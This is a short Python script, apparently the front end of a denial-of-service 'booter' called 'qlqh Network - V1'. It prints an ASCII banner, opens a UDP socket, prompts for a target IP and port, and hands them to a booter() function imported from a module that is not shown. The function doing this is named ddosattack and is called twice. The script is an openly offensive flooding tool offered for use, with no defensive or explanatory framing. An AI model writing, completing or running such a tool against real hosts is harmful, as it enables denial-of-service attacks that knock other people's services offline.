import sys,socket,colorama,time,os
from colorama import Fore,init

from booter import *
sys.stdout.write("\x1b]2; qlqh Network - V1\x07")
banner = f"""

{Fore.LIGHTRED_EX}
 ██████╗ ██╗      ██████╗ ██╗  ██╗    ███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
██╔═══██╗██║     ██╔═══██╗██║  ██║    ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
██║   ██║██║     ██║   ██║███████║    ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ 
██║▄▄ ██║██║     ██║▄▄ ██║██╔══██║    ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗ 
╚██████╔╝███████╗╚██████╔╝██║  ██║    ██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
 ╚══▀▀═╝ ╚══════╝ ╚══▀▀═╝ ╚═╝  ╚═╝    ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝


                                                                                                    
"""
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def ddosattack():
    import random
    
    print(banner)
    ip = input("Enter Target IP: ")
    port = int(input("Enter Target Port: "))
    booter(ip,port)
    time.sleep(1)
    os.system('clear')


ddosattack()



 
    

    
 



ddosattack()